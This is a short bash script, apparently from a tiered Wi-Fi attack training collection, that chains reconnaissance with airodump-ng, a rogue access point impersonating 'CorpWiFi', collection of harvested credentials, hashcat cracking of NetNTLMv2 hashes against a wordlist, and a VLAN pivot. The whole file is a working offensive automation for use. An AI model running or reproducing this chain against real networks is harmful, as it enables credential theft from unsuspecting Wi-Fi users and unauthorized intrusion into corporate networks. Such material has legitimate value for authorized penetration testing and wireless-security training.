#!/bin/bash
# Multi-vector chain automation
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"

echo "[*] Wi-Fi Attack Chain: Recon -> Rogue AP -> Harvest -> Crack -> Pivot"
echo "[*] Step 1: Reconnaissance"
airodump-ng wlan0mon --output-format csv -w /tmp/chain_recon &
PID1=$!
sleep 30
kill $PID1 2>/dev/null

echo "[*] Step 2: Deploy Rogue AP"
"$BASE_DIR/tier-2-intermediate/scripts/rogue-ap-deploy.sh" CorpWiFi 6 wlan0mon &
PID2=$!
sleep 60
kill $PID2 2>/dev/null

echo "[*] Step 3: Check harvested creds"
cat /tmp/creds.txt 2>/dev/null || echo "[!] No creds yet"

echo "[*] Step 4: Crack captured hashes"
# Auto-detect format: mode 5600 for NetNTLMv2 (MSCHAPv2), 5500 for legacy
if [ -f /tmp/creds.hash ]; then
    hashcat -m 5600 /tmp/creds.hash /usr/share/wordlists/rockyou.txt --force -O 2>/dev/null || \
    hashcat -m 5500 /tmp/creds.hash /usr/share/wordlists/rockyou.txt --force -O
fi

echo "[*] Step 5: Pivot via VLAN"
"$BASE_DIR/tier-2-intermediate/scripts/vlan-pivot.sh" eth0 10
